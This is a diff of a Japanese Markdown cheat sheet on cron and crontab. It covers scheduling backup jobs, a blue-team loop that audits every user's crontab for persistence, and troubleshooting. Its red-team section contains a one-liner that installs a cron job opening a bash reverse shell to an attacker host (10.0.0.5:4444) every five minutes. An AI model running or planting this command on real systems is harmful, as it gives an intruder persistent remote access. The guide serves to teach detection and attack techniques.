@@ -1,17 +1,18 @@
 ---
 tags:
-  - 'cron'
-  - 'crontab'
-  - 'cheetsheet'
-title: 'cron - コマンドを定期的に自動実行する'
-summary: '指定したスケジュールにしたがってコマンドやスクリプトを定期的・周期的に自動実行するデーモンおよびその設定ツールです。'
-related:
-  - 'at'
-  - 'systemd Timers'
-  - 'anacron'
+  - cron
+  - crontab
+  - at
+  - systemd_Timers
+  - anacron
+created: 2025-06-29 15:02
+modified: 2026-01-18 15:19
+environment: []
+vulnearability: []
+knowledge_category: Command
 ---
 
-# `cron` - コマンドを定期的に自動実行する
+# Command  - Linux - cron - コマンドを定期的に自動実行する
 
 ## 概要
 
@@ -38,19 +39,19 @@ related:
 * **解説**: まず実行したい処理をスクリプトとして作成し、実行権限を付与します。その後、`crontab -e` でエディタを開き、スケジュールと実行するスクリプトのフルパスを記述します。
 * **コマンド例**:
 
-    ```bash
-    # 1. バックアップスクリプトを作成・編集
-    vi /usr/local/bin/db_backup.sh
+```bash
+# 1. バックアップスクリプトを作成・編集
+vi /usr/local/bin/db_backup.sh
 
-    # 2. スクリプトに実行権限を付与
-    sudo chmod +x /usr/local/bin/db_backup.sh
+# 2. スクリプトに実行権限を付与
+sudo chmod +x /usr/local/bin/db_backup.sh
 
-    # 3. crontabを編集モードで開く
-    crontab -e
-    # 以下の行を追記:
-    # 毎日午前2時30分にバックアップスクリプトを実行
-    # 30 2 * * * /usr/local/bin/db_backup.sh > /var/log/db_backup.log 2>&1
-    ```
+# 3. crontabを編集モードで開く
+crontab -e
+# 以下の行を追記:
+# 毎日午前2時30分にバックアップスクリプトを実行
+# 30 2 * * * /usr/local/bin/db_backup.sh > /var/log/db_backup.log 2>&1
+```
 
 ## オプション説明 (`crontab` コマンド)
 
@@ -72,10 +73,10 @@ related:
 * **解説**: `crontab -e` でエディタを開き、スケジュールと実行コマンドを記述します。コマンドの出力は `/dev/null` にリダイレクトして不要な通知メールを防ぐか、ログファイルに追記するのが一般的です。
 * **例**:
 
-    ```crontab
-    # 毎日午前2時15分にバックアップスクリプトを実行し、ログを取る
-    15 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
-    ```
+```crontab
+# 毎日午前2時15分にバックアップスクリプトを実行し、ログを取る
+15 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
+```
 
 ### 2. ブルーチーム視点
 
@@ -84,13 +85,13 @@ related:
 * **解説**: `crontab -l -u` で各ユーザーのcronジョブをリスト表示します。システム全体のcronジョブ (`/etc/crontab`, `/etc/cron.d/`) も併せて監視し、攻撃者が永続化のために仕掛けた不審なジョブがないかを調査します。
 * **例**:
 
-    ```bash
-    # 全ユーザーのcron設定を確認するスクリプト例
-    for user in $(cut -f1 -d: /etc/passwd); do
-      echo "### Crontab for $user ###";
-      sudo crontab -l -u $user 2>/dev/null;
-    done
-    ```
+```bash
+# 全ユーザーのcron設定を確認するスクリプト例
+for user in $(cut -f1 -d: /etc/passwd); do
+	echo "### Crontab for $user ###";
+	sudo crontab -l -u $user 2>/dev/null;
+done
+```
 
 ### 3. レッドチーム視点
 
@@ -99,26 +100,26 @@ related:
 * **解説**: 現在のcron設定を読み込み、そこにリバースシェルを起動する行を追加して、パイプ経由で `crontab` に再設定します。これにより、一度セッションが切れても、再度システムに侵入できる状態を維持します。
 * **例**:
 
-    ```bash
-    # 5分ごとに攻撃者のサーバ(10.0.0.5:4444)へリバースシェルを接続するcronジョブを仕掛ける
-    (crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/10.0.0.5/4444 0>&1") | crontab -
-    ```
+```bash
+# 5分ごとに攻撃者のサーバ(10.0.0.5:4444)へリバースシェルを接続するcronジョブを仕掛ける
+(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/10.0.0.5/4444 0>&1") | crontab -
+```
 
 ## エラーメッセージとトラブルシューティング
 
 * 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。
 
 1. **現象**: **cronジョブが実行されない。**
-    * **考えられる原因**:
-        * **PATH環境変数の問題**: cronが実行される際の`PATH`は非常に限定的です。コマンドをフルパスで指定していないと失敗します。
-        * **パーミッション不足**: スクリプトに実行権限 (`+x`) が付与されていない。
-    * **解決策**:
-        * コマンドは `/usr/local/bin/myscript.sh` のように**必ずフルパスで指定**します。
-        * `chmod +x /path/to/script.sh` で実行権限を付与します。
+		* **考えられる原因**:
+				* **PATH環境変数の問題**: cronが実行される際の`PATH`は非常に限定的です。コマンドをフルパスで指定していないと失敗します。
+				* **パーミッション不足**: スクリプトに実行権限 (`+x`) が付与されていない。
+		* **解決策**:
+				* コマンドは `/usr/local/bin/myscript.sh` のように**必ずフルパスで指定**します。
+				* `chmod +x /path/to/script.sh` で実行権限を付与します。
 
 2. **現象**: **手動で実行するとうまくいくスクリプトが、cronだと動かない。**
-    * **考えられる原因**: ログインシェル (`.bashrc` など) で設定される環境変数がcron実行時には読み込まれないためです。
-    * **解決策**: スクリプト内で必要な環境変数を明示的に `export` するか、スクリプト冒頭で `cd /path/to/workdir` のように、期待するワーキングディレクトリに移動します。
+		* **考えられる原因**: ログインシェル (`.bashrc` など) で設定される環境変数がcron実行時には読み込まれないためです。
+		* **解決策**: スクリプト内で必要な環境変数を明示的に `export` するか、スクリプト冒頭で `cd /path/to/workdir` のように、期待するワーキングディレクトリに移動します。
 
 ## 環境変数と設定ファイル
 
@@ -154,5 +155,3 @@ related:
 * **出力のリダイレクト**: cronジョブが出力を行うと、デフォルトでユーザーにメールが送信されます。これを避けるため、`> /dev/null 2>&1` で出力を抑制するか、ログファイルに記録することが推奨されます。
 * **`%` のエスケープ**: crontab内で `%` 記号を使いたい場合（例: `date` コマンド）、バックスラッシュ `\` でエスケープする必要があります (`\%`)。
 
----
-[インデックスに戻る](../linux_index.md)
